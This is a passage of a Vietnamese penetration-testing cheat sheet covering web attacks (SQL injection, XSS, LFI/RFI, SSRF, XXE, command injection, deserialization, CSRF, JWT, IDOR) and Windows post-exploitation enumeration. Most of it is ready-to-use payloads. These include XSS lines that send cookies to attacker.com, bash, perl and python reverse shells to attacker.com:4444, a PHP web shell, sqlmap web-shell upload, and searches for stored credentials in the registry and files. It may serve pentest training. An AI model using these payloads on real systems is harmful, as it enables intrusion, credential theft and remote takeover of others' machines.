
# Trích xuất cơ sở dữ liệu
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# Thực thi lệnh hệ thống (cần đủ quyền)
sqlmap -u "http://target.com/page.php?id=1" --os-shell
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Tạo và upload web shell
sqlmap -u "http://target.com/page.php?id=1" --file-write=/path/to/local/shell.php --file-dest=/var/www/html/shell.php
```

### 3.1.3. Second-order Injections

Second-order (stored) SQL Injection là khi tấn công được thực hiện qua hai bước riêng biệt:

1. Payload được chèn vào hệ thống và lưu trữ (thường trong database)
2. Payload được kích hoạt khi được sử dụng bởi một hành động khác

#### Kỹ thuật kiểm tra:

```
# Chèn payload vào trường dữ liệu được lưu trữ (như username)
user' OR '1'='1

# Tìm các chức năng sử dụng dữ liệu đã lưu (như reset password)
```

#### Ví dụ về tấn công:

1. Đăng ký với username: `admin'--`
2. Khi ứng dụng tìm kiếm người dùng này, truy vấn sẽ trở thành: `SELECT * FROM users WHERE username='admin'--'`
3. Kết quả là bạn có thể truy cập vào tài khoản admin

## 3.2. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript độc hại vào các trang web, có thể dùng để đánh cắp cookie, session, thông tin nhạy cảm, hoặc chuyển hướng người dùng.

### Các loại XSS:

#### 1. Reflected XSS:

JavaScript được phản ánh ngay lập tức trong response, thường thông qua tham số URL.

```javascript
# Kiểm tra cơ bản
<script>alert("XSS")</script>
<img src=x onerror=alert("XSS")>
<body onload=alert("XSS")>

# Đánh cắp cookie
<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>

# Bypass các bộ lọc cơ bản
<scr<script>ipt>alert("XSS")</script>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;">
<div style="background:url('javascript:alert(1)')">
```

#### 1. Stored XSS:

JavaScript được lưu trữ trên server (ví dụ: trong cơ sở dữ liệu) và được thực thi khi người dùng khác xem trang.

```javascript
# Chèn vào các trường lưu trữ như comments, profiles, messages
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```

#### 3. DOM-based XSS:

JavaScript được thực thi thông qua việc thay đổi DOM của trang, thường xảy ra hoàn toàn ở phía client.

```javascript
# Tấn công các hàm như document.URL, document.location
<img src=x onerror=eval(location.hash.substring(1))>#alert("XSS")

# Tấn công các hàm jQuery như $("#element").html(user_input)
```

### XSS Cheat Sheet và Bypass Techniques:

```javascript
# Bypass WAF
<svg/onload=alert`1`>
<svg><script>alert&#40;1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<body/onload=&lt;!--&gt;&#10alert(1)>

# PoC để chứng minh impact
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://attacker.com/steal', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('data='+document.cookie);
</script>
```

## 3.3. File Inclusion Vulnerabilities (LFI/RFI)

File Inclusion Vulnerabilities cho phép kẻ tấn công đưa files từ server (LFI) hoặc từ xa (RFI) vào ứng dụng web, có thể dẫn đến lộ thông tin nhạy cảm hoặc thực thi mã từ xa.

### Local File Inclusion (LFI):

```
# Các payloads cơ bản
http://target.com/page.php?file=../../../etc/passwd
http://target.com/page.php?file=../../../windows/win.ini

# Bypass các filter cơ bản
http://target.com/page.php?file=....//....//....//etc/passwd
http://target.com/page.php?file=../../../etc/passwd%00    # Null byte (PHP < 5.3.4)
http://target.com/page.php?file=../../../etc/passwd\0
http://target.com/page.php?file=/var/www/../../etc/passwd

# Sử dụng wrapper PHP (PHP <= 8.0)
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
http://target.com/page.php?file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

### Remote File Inclusion (RFI):

```
# Payloads cơ bản (yêu cầu allow_url_include=On)
http://target.com/page.php?file=http://attacker.com/shell.txt
http://target.com/page.php?file=ftp://attacker.com/shell.txt

# Sử dụng shell PHP cơ bản
<?php system($_GET['cmd']); ?>
```

### LFI to RCE techniques:

```
# Thông qua log files
# 1. Chèn code PHP vào User-Agent
curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
# 1. Khai thác qua lỗ hổng LFI
http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=id

# Thông qua /proc/self/environ (environments)
http://target.com/page.php?file=/proc/self/environ

# Thông qua session files
# 1. Chèn PHP code vào session
http://target.com/page.php?param=<?php system('id'); ?>
# 1. Include session file
http://target.com/page.php?file=../../../var/lib/php/sessions/sess_SESSIONID

# Sử dụng PHP wrappers
http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%3D%3D&cmd=id
```

## 3.4. Server-Side Request Forgery (SSRF)

SSRF cho phép kẻ tấn công gửi các yêu cầu từ server ứng dụng đến các hệ thống nội bộ hoặc bên ngoài, thường vượt qua các cơ chế bảo vệ như firewalls.

### Basic SSRF payloads:

```
# Kiểm tra SSRF cơ bản
http://target.com/page?url=http://localhost
http://target.com/page?url=http://127.0.0.1
http://target.com/page?url=http://[::1]

# Quét ports nội bộ
http://target.com/page?url=http://127.0.0.1:22
http://target.com/page?url=http://127.0.0.1:3306

# Truy cập metadata cloud
http://target.com/page?url=http://169.254.169.254/latest/meta-data/   # AWS
http://target.com/page?url=http://metadata.google.internal/   # GCP
http://target.com/page?url=http://169.254.169.254/metadata   # Azure
```

### Bypass SSRF filters:

```
# Bypass blacklist domains
http://target.com/page?url=http://127.0.0.1
http://target.com/page?url=http://localhost.attacker.com
http://target.com/page?url=http://2130706433   # Decimal IP
http://target.com/page?url=http://0x7f000001   # Hex IP
http://target.com/page?url=http://0177.0.0.1   # Octal IP

# Redirection bypass
http://target.com/page?url=http://attacker.com/redirect.php  # Nơi redirect.php chuyển hướng đến http://localhost/admin

# URL encoding bypass
http://target.com/page?url=http://%31%32%37%2e%30%2e%30%2e%31

# Protocol bypass
http://target.com/page?url=file:///etc/passwd
http://target.com/page?url=dict://127.0.0.1:22
http://target.com/page?url=gopher://127.0.0.1:25/
```

### SSRF to RCE techniques:

```
# Gopher protocol (PHP, Java, Ruby)
http://target.com/page?url=gopher://127.0.0.1:25/HELO%20localhost%0AMAIL%20FROM...

# Redis exploitation
http://target.com/page?url=dict://127.0.0.1:6379/info
http://target.com/page?url=gopher://127.0.0.1:6379/_set:key:"%3C%3Fphp%20system...

# MySQL exploitation
http://target.com/page?url=gopher://127.0.0.1:3306/_[MYSQL PAYLOAD HERE]
```

## 3.5. XML External Entity (XXE)

XXE cho phép kẻ tấn công can thiệp vào quá trình xử lý XML của ứng dụng để truy cập files hệ thống, thực hiện SSRF, hoặc gây DoS.

### Basic XXE payloads:

```xml
# XXE để đọc file
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <data>&xxe;</data>
</root>

# XXE để thực hiện SSRF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service:8080"> ]>
<root>
  <data>&xxe;</data>
</root>
```

### Blind XXE attacks:

```xml
# Out-of-band XXE (cần máy chủ bên ngoài)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root>&send;</root>

# evil.dtd chứa
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### Error-based XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
]>
<root>&error;</root>
```

## 3.6. Command Injection

Command Injection cho phép kẻ tấn công thực thi các lệnh hệ thống trên server hosting ứng dụng web.

### Basic command injection payloads:

```
# Linux commands
;id
|id
`id`
$(id)
&id

# Windows commands
& whoami
| whoami
%0Awhoami

# Blind command injection (time-based)
& ping -c 10 127.0.0.1
| timeout 10
```

### Filter bypass techniques:

```
# Bypass space filter
cat</etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X

# Bypass blacklist commands
w'h'o'am'i
/???/??t /???/p??s??

# Command substitution
$(ls -la)
`cat /etc/passwd`

# Encoding techniques
echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'|bash    # Hex
```

### Setting up reverse shells from command injection:

```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Perl reverse shell
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## 3.7. Insecure Deserialization

Insecure Deserialization xảy ra khi ứng dụng giải mã chuyển (deserialize) dữ liệu người dùng không đáng tin cậy mà không thực hiện kiểm tra phù hợp, dẫn đến RCE, đánh cắp dữ liệu, hoặc DoS.

### PHP serialization attacks:

```php
// Tạo object độc hại PHP
class PHPObjectInjection
{
    public $inject = "system('id');";
    
    public function __destruct()
    {
        eval($this->inject);
    }
}

// Serialize object
$obj = new PHPObjectInjection();
echo serialize($obj);
// O:18:"PHPObjectInjection":1:{s:6:"inject";s:11:"system('id');";}
```

### Java deserialization attacks:

```
# Sử dụng ysoserial để tạo payloads
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

# Chuyển đổi thành Base64 để gửi
base64 -w0 payload.bin
```

### .NET deserialization:

```
# Sử dụng ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell -e BASE64_ENCODED_COMMAND"
```

## 3.8. Cross-Site Request Forgery (CSRF)

CSRF ép người dùng thực hiện các hành động không mong muốn trên ứng dụng web nơi họ đã xác thực, thông qua yêu cầu giả mạo.

### CSRF PoC examples:

```html
<!-- Ví dụ CSRF POST -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://target.com/change_password" method="POST">
      <input type="hidden" name="new_password" value="hacked">
      <input type="hidden" name="confirm_password" value="hacked">
    </form>
  </body>
</html>

<!-- Ví dụ CSRF GET -->
<img src="https://target.com/transfer?to=attacker&amount=1000" width="0" height="0">

<!-- CSRF với XHR request -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://target.com/api/update_profile", true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.withCredentials = true;
  xhr.send(JSON.stringify({
    "name": "Hacked User",
    "email": "attacker@evil.com"
  }));
</script>
```

### Bypass CSRF protections:

```
# Bypass CSRF token validation
- Sử dụng các yêu cầu không yêu cầu token
- Dự đoán giá trị token nếu được tạo không an toàn
- Tận dụng các lỗi XSS để đánh cắp token hợp lệ

# Bypass Same-Origin Policy
- Flash cross-domain policies
- Tận dụng các JSONP endpoints
- CORS misconfiguration
```

## 3.9. Broken Authentication

Broken Authentication xảy ra khi các chức năng liên quan đến xác thực và quản lý phiên được triển khai không đúng, cho phép kẻ tấn công chiếm đoạt tài khoản hoặc ID phiên.

### Common attack vectors:

```
# Brute force / Credential stuffing
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Session fixation
<a href="https://target.com/login?JSESSIONID=abcd">Click here</a>

# Password reset flaws
- Guessable/predictable tokens
- Tokens sent to compromised email accounts
- No confirmation required for email change 

# JWT attacks
- Using none algorithm: {"alg":"none","typ":"JWT"}
- Using known secrets: HS256 with weak secret
- Signature bypass by manipulating header/payload
```

### JWT token tampering:

```bash
# Decode JWT
jwtcrack token_here

# Brute force JWT secret
python3 jwt_tool.py eyJ0eXA...token_here -C -d /usr/share/wordlists/rockyou.txt

# Change algorithm from RS256 to HS256
python3 jwt_tool.py eyJ0eXA...token_here -T

# Use the public key as the secret in HS256
python3 jwt_tool.py eyJ0eXA...token_here -S hs256 -k public.pem
```

## 3.10. Insecure Direct Object References (IDOR)

IDOR cho phép kẻ tấn công truy cập trực tiếp vào các đối tượng dựa trên giá trị tham số do người dùng cung cấp, thường dẫn đến truy cập trái phép.

### Các kỹ thuật kiểm tra IDOR:

```
# Thay đổi ID trong URL
https://target.com/account/settings?user_id=123 -> https://target.com/account/settings?user_id=124

# Thay đổi ID trong JSON body
{"user_id": 123, "action": "view"} -> {"user_id": 124, "action": "view"}

# Thay đổi references trong cookies hoặc headers
Cookie: user=123 -> Cookie: user=124

# IDOR trong API endpoints
GET /api/users/123/profile -> GET /api/users/124/profile
```

### Kỹ thuật bypass IDOR protections:

```
# Sử dụng methods HTTP khác
POST /api/users/123 -> PUT /api/users/123

# Encode parameter
https://target.com/profile?id=123 -> https://target.com/profile?id=MTIz (base64)

# Sử dụng wildcard hoặc JSON arrays
{"user_id": "*"}
{"user_id": ["123", "124", "125"]}

# JSON parameter pollution
{"user_id": 123, "user_id": 124}
```

## 3.11. XML & API Attacks

### XXE in SOAP API:

```xml
<soap:Body>
  <foo>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <bar>&xxe;</bar>
  </foo>
</soap:Body>
```

### GraphQL vulnerabilities:

```
# GraphQL introspection (information disclosure)
query {
  __schema {
    types {
      name
      fields {
        name
        description
      }
    }
  }
}

# GraphQL field suggestion (bypass restrictions)
query {
  user(id: 1) {
    id
    username
    password
    is_admin
  }
}

# GraphQL batching attacks
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
  ...
  user100: user(id: 100) { name }
}
```

## 3.12. Business Logic Flaws

Business Logic Flaws là các vấn đề trong thiết kế và triển khai logic nghiệp vụ của ứng dụng, chứ không phải từ lỗi kỹ thuật.

```
# Tìm kiếm logic flaws trong xác thực và phân quyền
- Kiểm tra truy cập vào các tính năng hoặc dữ liệu không được phép sau khi đăng nhập
- Kiểm tra horizontal/vertical privilege escalation qua tham số URL

# Race conditions
- Thực hiện nhiều requests song song 
- Racing conditions trong xử lý thanh toán hoặc phiếu giảm giá

# Mass assignment/parameter binding
- Thêm tham số is_admin=true vào requests
- Thêm role=admin vào JSON payload

# Time-based logic flaws
- Manipulate request timestamps
- Exploit session timeouts
```

## 3.13. Kỹ thuật tìm lỗi tổng hợp

### Fuzzing techniques:

```bash
# Fuzzing parameters
ffuf -w params.txt:PARAM -w values.txt:VAL -u http://target.com?PARAM=VAL

# Fuzzing JSON fields
ffuf -w fields.txt:FIELD -u http://target.com/api -X POST -H "Content-Type: application/json" -d '{"FIELD":"value"}' -fr "error"

# Fuzzing với Burp Intruder
# Sử dụng Cluster Bomb hoặc Pitchfork attack
```

### Automation tools:

```bash
# OWASP ZAP automated scan
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" http://target.com

# Nikto web scanner
nikto -h http://target.com

# Nuclei templated scanning
nuclei -u http://target.com -t cves/ -t vulnerabilities/
```


---

Phần 4:

# 4. Windows Post-Exploitation

## 4.1. User Enumeration

User Enumeration (Liệt kê Người dùng) là quá trình thu thập thông tin về các tài khoản người dùng trên hệ thống Windows sau khi đã có quyền truy cập ban đầu. Đây là bước quan trọng trong quá trình post-exploitation, giúp xác định các mục tiêu tiềm năng để leo thang đặc quyền, cũng như nắm được cấu trúc phân quyền trong môi trường mục tiêu.

### Mục tiêu của User Enumeration

- Xác định các tài khoản người dùng có trên hệ thống
- Xác định quyền và nhóm của các tài khoản
- Tìm hiểu về các tài khoản quản trị, dịch vụ và các tài khoản đặc biệt khác
- Thu thập thông tin để chuẩn bị cho các cuộc tấn công sau này

### Các Lệnh Liệt kê Người dùng Cơ bản

#### Command Prompt (CMD)

```cmd
## Liệt kê tất cả người dùng trên hệ thống
net user

## Liệt kê thông tin chi tiết của một người dùng cụ thể
net user username

## Liệt kê tất cả các nhóm trên hệ thống
net localgroup

## Liệt kê thành viên của nhóm cụ thể (ví dụ: Administrators)
net localgroup Administrators

## Hiển thị người dùng đang đăng nhập
query user
```

#### PowerShell

```powershell
## Liệt kê tất cả người dùng local
Get-LocalUser | Select-Object Name, Enabled, Description, LastLogon

## Lấy thông tin chi tiết của một người dùng
Get-LocalUser -Name "username" | Format-List *

## Liệt kê tất cả nhóm local
Get-LocalGroup | Select-Object Name, Description

## Liệt kê thành viên của một nhóm
Get-LocalGroupMember -Group "Administrators"

## Kiểm tra người dùng hiện tại và đặc quyền
whoami
whoami /user
whoami /priv
whoami /groups
```

#### WMI Command Line (WMIC)

```cmd
## Liệt kê tài khoản người dùng
wmic useraccount list brief

## Liệt kê thông tin chi tiết về người dùng
wmic useraccount get name,sid,description,disabled,passwordrequired,passwordchangeable

## Liệt kê thông tin đăng nhập
wmic netlogin list brief
```

### Liệt kê Người dùng Nâng cao

#### Kiểm tra Quyền hạn và Đặc quyền

```powershell
## Kiểm tra các đặc quyền người dùng hiện tại
whoami /priv

## Truy vấn thông tin chi tiết về SID và quyền
whoami /all

## Kiểm tra xem người dùng có quyền gì trên hệ thống
accesschk.exe -uwcqv "username" * /accepteula
```

#### Kiểm tra Thông tin Đăng nhập và Phiên

```cmd
## Kiểm tra các phiên hiện tại
qwinsta

## Kiểm tra người dùng đang đăng nhập
quser

## Kiểm tra lịch sử đăng nhập
wevtutil qe Security /c:10 /rd:true /f:text /q:"*[System/EventID=4624]"
```

#### Kiểm tra Chính sách Mật khẩu

```cmd
## Kiểm tra chính sách mật khẩu và tài khoản
net accounts

## Kiểm tra chính sách mật khẩu chi tiết hơn
wmic path Win32_AccountPolicy GET MinimumPasswordAge,MaximumPasswordAge,MinimumPasswordLength,PasswordHistorySize
```

### Liệt kê Người dùng trong Active Directory (nếu tham gia domain)

```powershell
## Liệt kê người dùng trong domain
Get-ADUser -Filter * | Select-Object Name, Enabled, DistinguishedName

## Tìm kiếm tài khoản cụ thể
Get-ADUser -Filter "Name -like '*admin*'" | Select-Object Name, Enabled

## Liệt kê thành viên của một nhóm trong domain
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName

## Tìm tài khoản có quyền Service Principal Names (SPNs)
Get-ADUser -Filter * -Properties ServicePrincipalNames | Where-Object {$_.ServicePrincipalNames -ne $null}

## Tìm tài khoản không yêu cầu Pre-Authentication (AS-REP Roasting)
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $True}
```

Nếu PowerShell AD Module không có sẵn, bạn có thể sử dụng các lệnh cơ bản:

```cmd
## Liệt kê người dùng domain từ CMD
net user /domain

## Liệt kê thông tin người dùng cụ thể
net user username /domain

## Liệt kê các nhóm domain
net group /domain
```

### Liệt kê Thông tin Người dùng từ Registry

```powershell
## Kiểm tra SID của người dùng từ registry
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | 
    Select-Object @{Name="SID";Expression={$_.PSChildName}}, 
    @{Name="ProfilePath";Expression={$_.ProfileImagePath}}

## Kiểm tra các tài khoản đã lưu trong Credential Manager
cmdkey /list
```

### Trích xuất Thông tin từ các Tệp Cấu hình và Log

```powershell
## Tìm kiếm các tệp cấu hình có thể chứa thông tin người dùng
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config -File -Recurse -ErrorAction SilentlyContinue | 
    Select-String -Pattern "user|password|login" | Out-File -FilePath C:\temp\user_configs.txt

## Kiểm tra event logs cho thông tin đăng nhập
Get-WinEvent -LogName Security -MaxEvents 1000 | Where-Object {$_.Id -eq 4624} | 
    Select-Object TimeCreated, Message | Out-File -FilePath C:\temp\login_events.txt
```

### Kiểm tra Quyền Truy cập của Người dùng vào Tài nguyên

```powershell
## Kiểm tra các thư mục chia sẻ
net share

## Kiểm tra quyền trên thư mục
icacls "C:\Important_Folder"

## Kiểm tra quyền trên tệp tin
Get-Acl -Path "C:\Path\To\File.txt" | Format-List
```


### Các công cụ hữu ích cho User Enumeration

1. **PowerView**: Một phần của PowerSploit, cung cấp nhiều chức năng liệt kê nâng cao
   ```powershell
   ## Ví dụ sử dụng PowerView
   Import-Module .\PowerView.ps1
   Get-NetUser
   Get-NetGroup
   Get-NetLocalGroup
   ```

2. **BloodHound**: Công cụ mạnh mẽ để thu thập, phân tích và trực quan hóa dữ liệu Active Directory
   ```powershell
   ## Thu thập dữ liệu với SharpHound
   Invoke-BloodHound -CollectionMethod All
   ```

3. **LDAPDOMAINDUMP**: Công cụ để dump và phân tích thông tin domain qua LDAP
   ```bash
   ## Sử dụng trên máy attacker
   ldapdomaindump -u 'DOMAIN\user' -p 'password' <DC_IP>
   ```


## 4.2. System Information Gathering

Thu thập thông tin hệ thống là bước quan trọng sau khi có được quyền truy cập ban đầu vào máy Windows. Thông tin thu thập được sẽ giúp xác định các vector tấn công tiềm năng để leo thang đặc quyền và mở rộng kiểm soát trong hệ thống mục tiêu.

### Mục tiêu thu thập thông tin

Khi thực hiện thu thập thông tin hệ thống, bạn cần tập trung vào:

1. Thông tin cơ bản về hệ thống
2. Kiến trúc và phiên bản hệ điều hành
3. Hotfixes và patches đã được cài đặt
4. Thông tin mạng và kết nối
5. Cấu hình và các policy an ninh
6. Phần mềm được cài đặt
7. Dịch vụ đang chạy
8. Tiến trình đang hoạt động
9. Lịch sử hoạt động trên hệ thống

### Các lệnh cơ bản

#### Thông tin hệ thống

```powershell
## Thông tin cơ bản về hệ thống
systeminfo

## Thông tin chi tiết hơn với PowerShell
Get-ComputerInfo

## Thông tin phần cứng và hệ điều hành
wmic os get Caption, Version, OSArchitecture, BuildNumber
wmic computersystem get Model, Manufacturer, Name, UserName
```

#### Thông tin người dùng và nhóm

```powershell
## Danh sách người dùng local
net user
wmic useraccount list brief

## Thông tin chi tiết về người dùng hiện tại
whoami
whoami /all

## Liệt kê nhóm và thành viên
net localgroup
net localgroup Administrators
```

#### Thông tin mạng

```powershell
## Cấu hình mạng
ipconfig /all
route print

## Kết nối đang hoạt động
netstat -ano

## ARP cache
arp -a

## Thông tin DNS
ipconfig /displaydns

## Chia sẻ mạng
net share
wmic share list brief
```

#### Phần mềm và dịch vụ

```powershell
## Liệt kê phần mềm được cài đặt
wmic product get name, version
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

## Liệt kê tất cả dịch vụ
sc query
wmic service list brief
Get-Service

## Thông tin chi tiết về dịch vụ
wmic service get name, displayname, pathname, startmode | findstr /i "auto"
```

#### Quy trình đang chạy

```powershell
## Liệt kê tiến trình 
tasklist
wmic process list brief

## Liệt kê tiến trình với thông tin chi tiết
wmic process get caption, processid, commandline
Get-Process | Select-Object Name, Id, Path
```

#### Hotfixes và cập nhật

```powershell
## Liệt kê hotfixes đã cài đặt
wmic qfe get Caption, Description, HotFixID, InstalledOn
Get-HotFix
```

#### Policy bảo mật và cấu hình

```powershell
## Kiểm tra policy mật khẩu
net accounts

## Kiểm tra cấu hình tường lửa
netsh advfirewall show currentprofile
netsh firewall show state

## Kiểm tra policy UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

### Thu thập thông tin nâng cao

#### Sử dụng PowerShell để thu thập thông tin chi tiết

```powershell
## Kiểm tra quyền đặc biệt của người dùng hiện tại
whoami /priv

## Kiểm tra các scheduled tasks
schtasks /query /fo LIST /v

## Kiểm tra các tác vụ đã lên lịch với PowerShell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-List TaskName,TaskPath,State

## Kiểm tra các ứng dụng khởi động tự động
wmic startup list full
Get-CimInstance Win32_StartupCommand
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

#### Kiểm tra quyền hạn trên file/folder

```powershell
## Kiểm tra quyền trên thư mục Program Files
icacls "C:\Program Files"
icacls "C:\Program Files (x86)"

## Tìm các thư mục mà người dùng hiện tại có quyền ghi
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

#### Kiểm tra credentails và thông tin xác thực

```powershell
## Kiểm tra Windows Credential Manager
cmdkey /list

## Tìm kiếm các file có thể chứa mật khẩu
findstr /si password *.txt *.ini *.config *.xml
dir /s /b /a:-D *pass* == *cred* == *vnc* == *.config*

## Kiểm tra lịch sử PowerShell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath
```

#### Kiểm tra registry keys nhạy cảm

```powershell
## Kiểm tra AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword

## Tìm kiếm các khóa registry có chứa password
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

## Kiểm tra AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Tự động hóa thu thập thông tin hệ thống

#### Sử dụng script PowerShell để tự động hóa việc thu thập thông tin

```powershell
## PowerShell script đơn giản để thu thập thông tin hệ thống
$OutputFile = "C:\Users\Public\SystemInfo.txt"

## Header
"===== SYSTEM INFORMATION GATHERING =====" | Out-File -FilePath $OutputFile
"Collection Date: $(Get-Date)" | Out-File -FilePath $OutputFile -Append
"" | Out-File -FilePath $OutputFile -Append

## Thông tin OS
"===== OPERATING SYSTEM INFO =====" | Out-File -FilePath $OutputFile -Append
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsArchitecture, OsHardwareAbstractionLayer | Format-List | Out-File -FilePath $OutputFile -Append
"" | Out-File -FilePath $OutputFile -Append

## Thông tin User
"===== USER INFORMATION =====" | Out-File -FilePath $OutputFile -Append
whoami | Out-File -FilePath $OutputFile -Append
"" | Out-File -FilePath $OutputFile -Append
"--- User Privileges ---" | Out-File -FilePath $OutputFile -Append
whoami /priv | Out-File -FilePath $OutputFile -Append
"" | Out-File -FilePath $OutputFile -Append
"--- Local Users ---" | Out-File -FilePath $OutputFile -Append
Get-LocalUser | Format-Table Name, Enabled, Description | Out-File -FilePath $OutputFile -Append
"" | Out-File -FilePath $OutputFile -Append
"--- Local Administrators ---" | Out-File -FilePath $OutputFile -Append
Get-LocalGroupMember Administrators | Format-Table Name, PrincipalSource | Out-File -FilePath $OutputFile -Append

## Hotfixes
"===== INSTALLED HOTFIXES =====" | Out-File -FilePath $OutputFile -Append
Get-HotFix | Sort-Object -Property InstalledOn -Descending | Format-Table HotFixID, Description, InstalledOn | Out-File -FilePath $OutputFile -Append

## Network Information
"===== NETWORK INFORMATION =====" | Out-File -FilePath $OutputFile -Append
Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"} | Format-Table InterfaceAlias, IPAddress, PrefixLength | Out-File -FilePath $OutputFile -Append
"" | Out-File -FilePath $OutputFile -Append
"--- Network Connections ---" | Out-File -FilePath $OutputFile -Append
Get-NetTCPConnection -State Established,Listen | Format-Table LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Out-File -FilePath $OutputFile -Append

## Services
"===== SERVICES =====" | Out-File -FilePath $OutputFile -Append
"--- Non-standard Services ---" | Out-File -FilePath $OutputFile -Append
Get-Service | Where-Object {$_.Status -eq "Running" -and $_.StartType -eq "Automatic" -and $_.Name -notlike "Win*" -and $_.Name -notlike "App*" -and $_.Name -notlike "Net*"} | Format-Table Name, DisplayName, Status, StartType | Out-File -FilePath $OutputFile -Append

## Scheduled Tasks
"===== SCHEDULED TASKS =====" | Out-File -FilePath $OutputFile -Append
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*" -and $_.State -ne "Disabled"} | Format-Table TaskName, TaskPath, State | Out-File -FilePath $OutputFile -Append

## Installed Software
"===== INSTALLED SOFTWARE =====" | Out-File -FilePath $OutputFile -Append
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null} | Sort-Object DisplayName | Format-Table -AutoSize | Out-File -FilePath $OutputFile -Append

## Startup Items
"===== STARTUP ITEMS =====" | Out-File -FilePath $OutputFile -Append
Get-CimInstance Win32_StartupCommand | Format-Table Name, Command, User, Location | Out-File -FilePath $OutputFile -Append

Write-Host "System information collected and saved to $OutputFile"
```

#### Sử dụng công cụ tự động hóa

##### WinPEAS
```powershell
## Tải và thực thi WinPEAS
Invoke-WebRequest -Uri "http://[your-server]/winPEAS.exe" -OutFile "C:\Users\Public\winPEAS.exe"
C:\Users\Public\winPEAS.exe > C:\Users\Public\winpeas_results.txt
```

##### Seatbelt
```powershell
